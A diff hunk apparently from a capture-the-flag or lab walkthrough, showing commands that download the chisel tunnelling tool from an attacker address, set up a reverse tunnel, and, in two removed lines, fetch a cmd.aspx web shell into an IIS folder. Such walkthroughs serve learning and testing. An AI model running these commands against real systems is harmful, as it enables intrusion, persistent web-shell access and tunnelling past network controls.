@@ -174,8 +174,6 @@ wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_li
 gunzip chisel_1.9.1_linux_amd64.gz
 cd C:\ProgramData
 powershell -c wget 10.10.14.10/chisel_1.9.1_windows_amd64 -outfile c.exe
-cd C:\inetpub\development
-powershell -c wget 10.10.14.10/cmd.aspx -outfile cmd.aspx
 ./chisel_1.9.1_linux_amd64 server -p 8000 --reverse
 .\c.exe client 10.10.14.10:8000 R:8001:127.0.0.1:8000
 ```
